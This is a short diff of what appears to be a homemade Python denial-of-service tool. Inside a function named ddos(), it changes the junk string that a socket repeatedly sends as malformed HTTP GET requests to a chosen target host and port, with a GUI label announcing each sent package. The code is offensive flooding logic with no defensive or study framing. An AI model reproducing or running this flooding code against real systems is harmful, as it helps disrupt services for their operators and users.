@@ -14,8 +14,8 @@ def ddos():
             try:
                 mysocket.connect((target, port))
                 #random scheiß daten
-                mysocket.send(str.encode("GET " + "lul" + "HTTP/1.1 \r\n"))
-                mysocket.sendto(str.encode("GET " + "lul" + "HTTP/1.1 \r\n"), (target, port))
+                mysocket.send(str.encode("GET " + "hax lol" + "HTTP/1.1 \r\n"))
+                mysocket.sendto(str.encode("GET " + "hax lol" + "HTTP/1.1 \r\n"), (target, port))
                 label = Label(window, text="send package")
                 label.pack()
             except socket.error:
